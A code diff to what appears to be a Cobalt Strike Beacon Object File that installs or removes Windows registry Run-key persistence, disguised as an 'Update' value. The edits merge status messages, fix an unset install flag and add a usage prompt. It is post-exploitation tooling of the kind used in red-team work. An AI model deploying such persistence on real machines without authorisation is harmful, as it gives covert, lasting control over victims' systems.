@@ -20,8 +20,9 @@ void InstallPersistence() {
         BeaconPrintf(CALLBACK_OUTPUT,"Key opened \n");
         if (ADVAPI32$RegSetValueExW(key, L"Update", 0, REG_SZ, (LPBYTE)payload, sizeof(payload)) == ERROR_SUCCESS)
         {
-            BeaconPrintf(CALLBACK_OUTPUT,"Key changed in registry \n");
-            BeaconPrintf(CALLBACK_OUTPUT,"Persistence Installed \n");
+            BeaconPrintf(CALLBACK_OUTPUT,"Key changed in registry, persistence installed \n");
+
+            
         }
         else{
             BeaconPrintf(CALLBACK_OUTPUT,"Key not changed in registry \n");
@@ -49,8 +50,7 @@ void RemovePersistence() {
         BeaconPrintf(CALLBACK_OUTPUT,"Key location open successful \n");
         if (ADVAPI32$RegDeleteKeyValueW(key, L"Run", keyname) == ERROR_SUCCESS)
         {
-            BeaconPrintf(CALLBACK_OUTPUT,"Key deleted in registry \n");
-            BeaconPrintf(CALLBACK_OUTPUT,"Persistence Removed \n");
+            BeaconPrintf(CALLBACK_OUTPUT,"Key deleted in registry, persistence removed. \n");
         }
         else{
             BeaconPrintf(CALLBACK_OUTPUT,"Key not deleted in registry \n");
@@ -69,10 +69,13 @@ void go(char * args, int alen) {
     int remove;
     int install;
     remove = MSVCRT$strcmp(args, "Remove") == 0;
+    install = MSVCRT$strcmp(args, "Install") == 0;
     if(remove > 0) {
         RemovePersistence();
     }else if(install > 0){
         InstallPersistence();
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "Please use either an Install or Remove argument.");
     }
     
 }
